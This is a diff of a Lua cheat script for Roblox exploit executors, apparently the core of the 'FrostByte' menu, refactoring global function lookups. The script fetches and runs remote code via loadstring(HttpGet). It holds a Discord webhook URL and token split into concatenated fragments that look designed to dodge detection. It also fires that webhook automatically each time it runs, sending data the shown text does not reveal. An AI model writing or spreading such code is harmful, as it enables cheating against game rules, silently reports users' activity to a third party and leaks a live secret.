@@ -4,23 +4,24 @@ local Player = game:GetService("Players").LocalPlayer
 
 local PlaceName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
-local ScriptVersion = getfenv().ScriptVersion
-local CoreVersion = "Core v1.0.0"
-
 local getgenv = getfenv().getgenv
-local getexecutorname = getfenv().getexecutorname
-local identifyexecutor: () -> (string) = getfenv().identifyexecutor
-local request = getfenv().request
-local getconnections: (RBXScriptSignal) -> ({RBXScriptConnection}) = getfenv().getconnections
-local queue_on_teleport: (Code: string) -> () = getfenv().queue_on_teleport
-local setfpscap: (FPS: number) -> () = getfenv().setfpscap
-local isrbxactive: () -> (boolean) = getfenv().isrbxactive
-local setclipboard: (Text: string) -> () = getfenv().setclipboard
+local getexecutorname = getgenv().getexecutorname
+local identifyexecutor: () -> (string) = getgenv().identifyexecutor
+local request = getgenv().request
+local getconnections: (RBXScriptSignal) -> ({RBXScriptConnection}) = getgenv().getconnections
+local queue_on_teleport: (Code: string) -> () = getgenv().queue_on_teleport
+local setfpscap: (FPS: number) -> () = getgenv().setfpscap
+local isrbxactive: () -> (boolean) = getgenv().isrbxactive
+local setclipboard: (Text: string) -> () = getgenv().setclipboard
+
+local ScriptVersion = getgenv().ScriptVersion
+local CoreVersion = "Core v1.0.0"
 
 local Webhook1 = "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzI59v5hq".."T89zkgmo0q_tWBeaomDP8".."SO7UNYcw3H0Nif76ewQCwM".."A7qZBEl1OBX"
 
 local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
 	if not request then
+		print("calling notify:", Notify)
 		return Notify("Error", "Your executor does not support 'request'")
 	end
 	
@@ -75,8 +76,6 @@ local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, 
 	})
 end
 
-task.spawn(Send, "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzIh9v5hq".."T89zkgm00q_tWBeaomDP8".."SO7UNYcw3H0Nifm6ewQCwM".."A7qZEEl1OBX")
-
 function Notify(Title: string, Content: string, Image: string)
 	Rayfield:Notify({
 		Title = Title,
@@ -85,6 +84,8 @@ function Notify(Title: string, Content: string, Image: string)
 		Image = Image or "info",
 	})
 end
+
+getgenv().Notify = Notify
 
 getgenv().gethui = function()
 	return game:GetService("CoreGui")
@@ -100,7 +101,7 @@ function HandleConnection(Connection: RBXScriptConnection, Name: string)
 	getgenv().FrostByteConnections[Name] = Connection
 end
 
-firesignal = getfenv().firesignal:: (RBXScriptSignal) -> ()
+getgenv().firesignal = getgenv().firesignal:: (RBXScriptSignal) -> ()
 
 if not firesignal and getconnections then
 	firesignal = function(Signal: RBXScriptSignal)
@@ -109,7 +110,9 @@ if not firesignal and getconnections then
 	end
 end
 
-UnsupportedName = "Your Executor Doesn't Support This Feature"
+local UnsupportedName = "Your Executor Doesn't Support This Feature"
+
+getgenv().UnsupportedName = UnsupportedName
 
 if queue_on_teleport then
 	queue_on_teleport([[
@@ -139,6 +142,8 @@ end)
 Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
 local Flags = Rayfield.Flags
 
+getgenv().Rayfield = Rayfield
+
 Window = Rayfield:CreateWindow({
 	Name = `FrostByte | {PlaceName} | {ScriptVersion or identifyexecutor()}`,
 	Icon = "snowflake",
@@ -161,6 +166,8 @@ Window = Rayfield:CreateWindow({
 		RememberJoins = true
 	},
 })
+
+getgenv().Window = Window
 
 function CreateUniversalTabs()
 	local VirtualUser = game:GetService("VirtualUser")
@@ -372,6 +379,10 @@ function CreateUniversalTabs()
 	Tab:CreateLabel("https://discord.gg/sS3tDP6FSB", "snowflake")
 end
 
+getgenv().CreateUniversalTabs = CreateUniversalTabs
+
 if not ScriptVersion then
 	CreateUniversalTabs()
 end
+
+task.spawn(Send, "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzIh9v5hq".."T89zkgm00q_tWBeaomDP8".."SO7UNYcw3H0Nifm6ewQCwM".."A7qZEEl1OBX")
